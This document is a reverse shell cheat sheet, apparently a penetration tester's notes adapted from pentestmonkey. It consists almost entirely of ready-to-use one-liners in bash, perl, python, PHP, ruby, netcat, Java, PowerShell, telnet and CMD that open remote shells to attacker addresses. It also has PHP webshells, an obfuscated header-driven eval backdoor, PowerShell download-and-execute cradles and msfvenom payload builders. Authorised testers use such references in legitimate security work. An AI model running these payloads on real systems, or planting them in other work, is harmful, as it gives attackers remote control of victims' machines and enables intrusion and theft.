Reverse Shell Cheat Sheet
=======================================


References
<https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>

# Bash
Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
    
    /bin/bash -l > /dev/tcp/10.10.14.96/8081 0<&1 2>&1
    
    /bin/bash -l > /dev/tcp/10.10.14.17/8081 0<&1 2>&1
    
    /usr/bin/bash -l > /dev/tcp/10.10.14.17/8081 0<&1 2>&1


    
# PERL
Here’s a shorter, feature-free version of the perl-reverse-shell:

    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Python
This was tested under Linux / Python 2.7:

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    
Python 3
    
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.109",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…

    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
If you want a .php file to upload, see the more featureful and robust php-reverse-shell.

    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
    
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"10.10.14.21"/443 0>&1'");?>
    http://10.10.14.21/shell.php
    http://10.10.14.21/webshell.php
    http://10.10.14.21/webshell.php?cmd=whoami
    <?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
    
Webshell

    <?php system($_REQUEST['cmd']); ?>

# Ruby
    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

    nc -e /bin/sh 10.0.0.1 1234
    nc -e /bin/bash 10.0.0.1 4242
    nc -c bash 10.0.0.1 4242
    /bin/sh | nc 10.0.0.1 80
    rm -f /tmp/p; mknod /tmp/p p && nc 10.0.0.1 4444 0/tmp/p
    
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
    
 OpenBSD Netcat

    mkfifo /tmp/lol;nc 10.10.14.17 8081 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol

If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.17 8081 >/tmp/f

# Java
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

# powershell

    $client = New-Object System.Net.Sockets.TCPClient("10.10.14.17",8081);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    
    # ESCAPED
    $client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.17\",8081);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    
    
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.17",8081);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

    powershell -ExecutionPolicy Bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.17/powercat.ps1');powercat -c 10.10.14.17 -p 8081 -e powershell"
    
    powershell -ExecutionPolicy Bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.134/invoke-powershell-tcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.134 -Port 443

    $client = New-Object System.Net.Sockets.TCPClient('10.10.14.17',8081);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# xterm
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

    xterm -display 10.0.0.1:1
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

Xnest :1
You’ll need to authorise the target to connect to you (command also run on your host):

    xhost +targetip
    
# telnet

    telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
    
    rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

# CMD

Aqui vale uns comentários. Vale ressalltar que todos eles dependem de um terceiro para funcionar. Seja o netcat ou seja o powershell com duas variações interessantes.

Como o CMD em si não proporciona nenhuma ferramenta para obtermos shell reversa, temos algumas opções interessantes aqui  disponíveis... são elas:

    C:\Windows\System32\cmd.exe /c "mkdir c:\temp & copy \\10.10.14.11\smb\nc64.exe c:\temp\w.exe & c:\temp\w.exe -e C:\Windows\System32\cmd.exe 10.10.14.11 8082"
 
Nesse caso temos a opção de subir um netcat na máquina alvo e executá-lo conforme comando acima. Outra opção seria utilizar o powershell para abertura dessa shell

    C:\Windows\System32\cmd.exe /c "powershell -ExecutionPolicy Bypass -Command [scriptblock]::Create((Invoke-WebRequest "http://192.168.0.165/shell2.txt").Content).Invoke();"
    
    C:\Windows\System32\cmd.exe /c "powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.165/powercat.ps1');powercat -c 192.168.0.165 -p 8083 -e powershell"

# msfvenom

## Windows (web)
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp


## linux  
    msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=192.168.119.181 LPORT=80 > rshell.elf


## java

WAR PAYLOAD

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.150 LPORT=80 -f war -o rshell.war

JSP PAYLOAD

    msfvenom -p java/jsp_shell_reverse_tcp -f raw LHOST=192.168.119.143 LPORT=5555 > shell.jsp